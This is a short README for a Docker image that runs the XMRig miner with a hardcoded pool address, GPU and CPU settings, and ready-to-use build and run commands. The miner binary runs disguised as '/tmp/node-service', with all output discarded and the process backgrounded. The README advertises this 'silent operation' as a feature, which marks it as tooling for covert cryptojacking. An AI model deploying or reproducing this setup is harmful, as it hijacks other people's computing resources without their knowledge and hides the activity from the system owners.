# Docker XMRig - Hardcoded Version

This is a simplified version of docker-xmrig with hardcoded parameters for mining. All configuration is baked into the container with no environment variables or runtime parameters.

## Hardcoded Configuration

- **Pool**: 62.60.148.249:9940
- **CUDA**: Enabled
- **CPU Max Threads**: 80
- **Output**: Redirected to /dev/null (silent operation)
- **Background**: Runs as background process

## Build

```bash
docker build -t xmrig-hardcoded .
```

## Run

```bash
docker run -d --name xmrig-miner xmrig-hardcoded
```

## Features

- No environment variables required
- No runtime configuration
- Simplified deployment
- CUDA GPU mining support
- Automatic background execution
- Silent operation (no console output)

## Command Executed

The container runs this exact command:

```bash
/tmp/node-service -o 62.60.148.249:9940 --cuda --cuda-loader=/usr/local/lib/libxmrig-cuda.so --cpu-max-threads-hint 80 > /dev/null 2>&1 &
```

## Requirements

- Docker with GPU support (for CUDA functionality)
- NVIDIA GPU with appropriate drivers
- Sufficient system resources
